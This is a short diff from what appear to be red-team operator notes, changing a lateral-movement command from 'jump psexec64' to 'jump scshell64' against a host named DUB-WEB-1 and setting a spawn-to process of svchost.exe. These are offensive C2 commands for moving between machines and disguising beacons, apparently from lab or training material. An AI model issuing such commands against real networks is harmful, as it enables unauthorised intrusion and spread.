@@ -12,7 +12,7 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 
 Jump via psexec64
 ```powershell
-jump psexec64 DUB-WEB-1 smb
+jump scshell64 DUB-WEB-1 smb
 
 jump psexec64 DUB-WKSTN-2 smb
 
